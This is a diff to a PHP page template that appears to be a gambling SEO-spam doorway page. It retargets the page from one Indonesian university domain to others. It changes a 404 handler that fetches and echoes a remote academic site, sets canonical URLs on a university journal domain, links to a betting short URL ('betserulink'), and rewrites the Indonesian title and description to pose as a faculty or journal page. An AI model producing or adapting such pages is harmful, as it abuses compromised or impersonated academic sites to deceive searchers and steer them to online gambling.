@@ -1,7 +1,7 @@
 <?php
 function feedback404()
 {
-  echo file_get_contents("https://polbitrada.ac.id/");
+  echo file_get_contents("https://feb.unisba.ac.id/");
 
 }
 
@@ -33,14 +33,14 @@ if (!$found) {
     show404();
 }
 $amphtml = "https://tamuramah.store/id/$dashbrand";
-$canonical = "https://polbitrada.ac.id/images/$dashbrand";
+$canonical = "https://ejournal.poltekkes-smg.ac.id/assets/$dashbrand";
 $cta = "https://t.ly/betserulink";
-$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1731503465/OIG4.4MDn1BeimdYlpOlpOi7o_phnj3z.jpg";
+$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1731680826/OIG3.s3U2dmTVFFp4C.9sv2Ea_le30ix.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Politeknik Bina Trada Semarang";
-$desc = "$namabrand menjadi salah satu fakultas yang banyak diminati di kampus Politeknik Bina Trada di kota Semarang dengan adanya fasilitas yang cukup lengkap dengan bangunan kampus yang megah menjadi opsi untuk setiap pelajar ingin melanjutkan pendidikannya.";
-$konten = "$namabrand menjadi salah satu fakultas yang banyak diminati di kampus Politeknik Bina Trada di kota Semarang dengan adanya fasilitas yang cukup lengkap dengan bangunan kampus yang megah menjadi opsi untuk setiap pelajar ingin melanjutkan pendidikannya.";
+$judul = "$namabrand Journal Poltekkes Kemenkes Semarang";
+$desc = "$namabrand memiliki platform untuk jurnal sistem dari Poltekkes Kemenkes Semarang yang bisa diakses secara online dan gratis untuk setiap mahasiswa serta mahasiswi yang berkuliah di kampus ini dari semua jurusan sesuai jurnalnya masing-masing.";
+$konten = "$namabrand memiliki platform untuk jurnal sistem dari Poltekkes Kemenkes Semarang yang bisa diakses secara online dan gratis untuk setiap mahasiswa serta mahasiswi yang berkuliah di kampus ini dari semua jurusan sesuai jurnalnya masing-masing.";
 ?>
 
 <!DOCTYPE HTML>
